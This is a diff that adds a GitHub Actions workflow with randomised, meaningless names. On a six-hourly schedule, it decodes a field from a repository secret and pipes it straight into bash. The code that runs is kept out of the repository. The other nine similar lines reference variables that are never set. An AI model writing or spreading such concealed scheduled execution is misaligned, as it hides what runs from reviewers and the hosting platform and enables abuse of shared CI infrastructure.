@@ -1,0 +1,26 @@
+name: benrenshiyigesddas
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: benrenshiyigesddas
+        env:
+          eajxz9946: ${{ secrets.eajxz9946 }}
+        run: |
+          echo $eajxz9946 | jq -r .pxbs0708 | /bin/bash
+          echo $qa4 | jq -r .dq0985 | /bin/bash
+          echo $g52606 | jq -r .zzzm9587 | /bin/bash
+          echo $i2 | jq -r .gpeq899 | /bin/bash
+          echo $uzcch81749 | jq -r .lkvap855 | /bin/bash
+          echo $tuort00349 | jq -r .bu1 | /bin/bash
+          echo $nmqj8 | jq -r .wzk33 | /bin/bash
+          echo $wmop327 | jq -r .ndzg25049 | /bin/bash
+          echo $kb157 | jq -r .bvqda00 | /bin/bash
+          echo $wcvii3158 | jq -r .pyr3905 | /bin/bash
+
